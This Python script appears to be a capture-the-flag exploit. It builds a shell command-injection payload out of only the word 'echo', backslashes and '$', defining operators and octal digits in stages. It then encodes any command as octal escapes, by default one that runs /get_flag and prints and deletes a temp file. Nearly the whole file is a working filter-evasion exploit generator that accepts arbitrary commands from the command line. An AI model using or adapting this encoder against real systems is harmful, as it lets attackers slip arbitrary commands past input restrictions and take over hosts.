import sys

final = "echo "
# round 1 - establish the equals sign
equals = 'echo=\\\\='

final += equals + "\;"

# round 2 - establish semicolon and apostrophe
final += "echo "
equals = 'echo\\$echo{}$echo'.format("\\"*5)
semicolon = 'echoecho\\$echo{};'.format("\\"*7)
apos = "echoechoecho\$echo{}'".format("\\"*7)

final += equals + " " +semicolon + " " + apos + " \\\\\\;"


# round 3 - establish brackets
final += "echo "
equals = 'echo{}$echo{}$echo'.format("\\"*3, "\\"*9)
semicolon = 'echoecho{}$echo{}$echoecho'.format("\\"*3, "\\"*11)
apos = "echoechoecho{}$echo{}$echoechoecho".format("\\"*3, "\\"*11)
plus = "echoechoechoechoecho\$echo\\\\+"
lbracket = "echoechoechoechoechoecho{}$echo{}(".format("\\"*5, "\\"*15)
rbracket = "echoechoechoechoechoechoecho{}$echo{})".format("\\"*5, "\\"*15)

final += equals + " "  + semicolon + " " + apos 
final += " " + lbracket + " " + rbracket + " " + " " +plus
final += "\\"*3 + "$echoecho"


# round 4 - establish all octal digits
final += " echo echo "
equals = 'echo{}$echo{}$echo'.format("\\"*5, "\\"*33)
semicolon = 'echoecho{}$echo{}$echoecho'.format("\\"*5, "\\"*55)
apos = "echoechoecho{}$echo{}$echoechoecho".format("\\"*5, "\\"*55)
# zero = $((echo))
zero = "echoechoechoecho{}$echo{}${}$echoechoechoechoechoecho{}$echoechoechoechoechoecho{}echo{}$echoechoechoechoechoechoecho{}$echoechoechoechoechoechoecho".format("\\"*5, "\\"*9, "\\"*7, "\\"*7, "\\"*9, "\\"*7, "\\"*7)
# one = $((++echo))
one = "echoechoechoechoecho{}$echo{}${}$echoechoechoechoechoecho{}$echoechoechoechoechoecho{}$echoechoechoechoecho{}$echoechoechoechoecho{}echo{}$echoechoechoechoechoechoecho{}$echoechoechoechoechoechoecho".format("\\"*5, "\\"*9, "\\"*7, "\\"*7, "\\"*7, "\\"*7, "\\"*9, "\\"*7, "\\"*7)
two = "echoechoechoechoechoecho{}$echo{}${}$echoechoechoechoechoecho{}$echoechoechoechoechoecho{}$echoechoechoechoecho{}$echoechoechoechoecho{}echo{}$echoechoechoechoechoechoecho{}$echoechoechoechoechoechoecho".format("\\"*5, "\\"*9, "\\"*7, "\\"*7, "\\"*7, "\\"*7, "\\"*9, "\\"*7, "\\"*7)
three = "echoechoechoechoechoechoecho{}$echo{}${}$echoechoechoechoechoecho{}$echoechoechoechoechoecho{}$echoechoechoechoecho{}$echoechoechoechoecho{}echo{}$echoechoechoechoechoechoecho{}$echoechoechoechoechoechoecho".format("\\"*5, "\\"*9, "\\"*7, "\\"*7, "\\"*7, "\\"*7, "\\"*9, "\\"*7, "\\"*7)
four = "echoechoechoechoechoechoechoecho{}$echo{}${}$echoechoechoechoechoecho{}$echoechoechoechoechoecho{}$echoechoechoechoecho{}$echoechoechoechoecho{}echo{}$echoechoechoechoechoechoecho{}$echoechoechoechoechoechoecho".format("\\"*5, "\\"*9, "\\"*7, "\\"*7, "\\"*7, "\\"*7, "\\"*9, "\\"*7, "\\"*7)
five = "echoechoechoechoechoechoechoechoecho{}$echo{}${}$echoechoechoechoechoecho{}$echoechoechoechoechoecho{}$echoechoechoechoecho{}$echoechoechoechoecho{}echo{}$echoechoechoechoechoechoecho{}$echoechoechoechoechoechoecho".format("\\"*5, "\\"*9, "\\"*7, "\\"*7, "\\"*7, "\\"*7, "\\"*9, "\\"*7, "\\"*7)
six = "echoechoechoechoechoechoechoechoechoecho{}$echo{}${}$echoechoechoechoechoecho{}$echoechoechoechoechoecho{}$echoechoechoechoecho{}$echoechoechoechoecho{}echo{}$echoechoechoechoechoechoecho{}$echoechoechoechoechoechoecho".format("\\"*5, "\\"*9, "\\"*7, "\\"*7, "\\"*7, "\\"*7, "\\"*9, "\\"*7, "\\"*7)
seven = "echoechoechoechoechoechoechoechoechoechoecho{}$echo{}${}$echoechoechoechoechoecho{}$echoechoechoechoechoecho{}$echoechoechoechoecho{}$echoechoechoechoecho{}echo{}$echoechoechoechoechoechoecho{}$echoechoechoechoechoechoecho".format("\\"*5, "\\"*9, "\\"*7, "\\"*7, "\\"*7, "\\"*7, "\\"*9, "\\"*7, "\\"*7)
final += equals + " " + semicolon + " " + apos + " " + zero + " "
final += one + " " + two + " " + three + " " + four + " " 
final += five + " " + six + " " + seven  + " "

final +="\\"*23 + "$echoecho "

final += "echo "
codes = {
        "0": "\\" * 31 +  "$" + "echo"*4,
        "1": "\\" * 31 +  "$" + "echo"*5,
        "2": "\\" * 31 +  "$" + "echo"*6,
        "3": "\\" * 31 +  "$" + "echo"*7,
        "4": "\\" * 31 +  "$" + "echo"*8,
        "5": "\\" * 31 +  "$" + "echo"*9,
        "6": "\\" * 31 +  "$" + "echo"*10,
        "7": "\\" * 31 +  "$" + "echo"*11,
        "'":  "\\" * 31 + "$echoechoecho",
        "\\": "\\"*64,
        "$": "\\"*32 + "$",
}

def encode(cmd):
    res = codes["$"]  + codes["'"]
    for c in cmd:
        digits = oct(ord(c))[1:]
        res += codes["\\"]
        for d in digits:
            res += codes[d]
    res += codes["'"]
    return res


# pwn
##final += encode("id")

if len(sys.argv) == 1:
    final += encode("bash") + " " + encode("-c") + " " + encode("bash -c 'expr $(grep + /tmp/IAM_THE_BESTEST_HACKZ0R)' | /get_flag > /tmp/IAM_THE_BESTEST_HACKZ0R; cat /tmp/IAM_THE_BESTEST_HACKZ0R; rm /tmp/IAM_THE_BESTEST_HACKZ0R")
else:
    final += ' '.join(map(encode, sys.argv[1:]))





print(final)
